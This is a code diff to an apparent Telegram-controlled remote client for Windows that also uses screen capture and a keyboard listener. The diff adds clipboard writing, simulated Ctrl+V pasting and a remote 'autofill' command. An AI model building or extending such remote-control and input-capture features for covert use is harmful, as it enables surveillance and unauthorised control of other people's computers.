@@ -33,7 +33,7 @@ from PIL import ImageGrab
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
 
-from pynput.keyboard import Key, KeyCode, Listener
+from pynput.keyboard import Controller, Key, KeyCode, Listener
 try:
     from pywinauto import Desktop
 except ImportError:
@@ -535,6 +535,51 @@ def get_clipboard_text():
     finally:
         user32.CloseClipboard()
     return text
+
+
+def set_clipboard_text(text):
+    if os.name != "nt":
+        raise RuntimeError("Clipboard control is only supported on Windows")
+
+    user32 = ctypes.windll.user32
+    kernel32 = ctypes.windll.kernel32
+    value = str(text)
+    encoded = (value + "\0").encode("utf-16-le")
+    handle = kernel32.GlobalAlloc(0x0042, len(encoded))
+    if not handle:
+        raise RuntimeError("Could not allocate clipboard memory")
+    pointer = kernel32.GlobalLock(handle)
+    if not pointer:
+        kernel32.GlobalFree(handle)
+        raise RuntimeError("Could not lock clipboard memory")
+    try:
+        ctypes.memmove(pointer, encoded, len(encoded))
+    finally:
+        kernel32.GlobalUnlock(handle)
+
+    if not user32.OpenClipboard(None):
+        kernel32.GlobalFree(handle)
+        raise RuntimeError("Could not open the clipboard")
+    try:
+        user32.EmptyClipboard()
+        if not user32.SetClipboardData(13, handle):
+            kernel32.GlobalFree(handle)
+            raise RuntimeError("Could not set the clipboard")
+        handle = None
+    finally:
+        user32.CloseClipboard()
+        if handle:
+            kernel32.GlobalFree(handle)
+
+
+def autofill_text(text):
+    set_clipboard_text(text)
+    time.sleep(0.1)
+    keyboard = Controller()
+    keyboard.press(Key.ctrl)
+    keyboard.press("v")
+    keyboard.release("v")
+    keyboard.release(Key.ctrl)
 
 
 def normalize_key(key):
@@ -1089,6 +1134,12 @@ def handle_device_command(command, command_id=None, message=""):
             if os.name != "nt":
                 raise RuntimeError("App closing is only supported on Windows")
             close_all_visible_apps()
+        elif command == "autofill":
+            if os.name != "nt":
+                raise RuntimeError("Autofill is only supported on Windows")
+            if not str(message).strip():
+                raise RuntimeError("Autofill text cannot be empty")
+            autofill_text(str(message))
         elif command == "update_client":
             if os.name != "nt":
                 raise RuntimeError("Client updates are only supported on Windows")
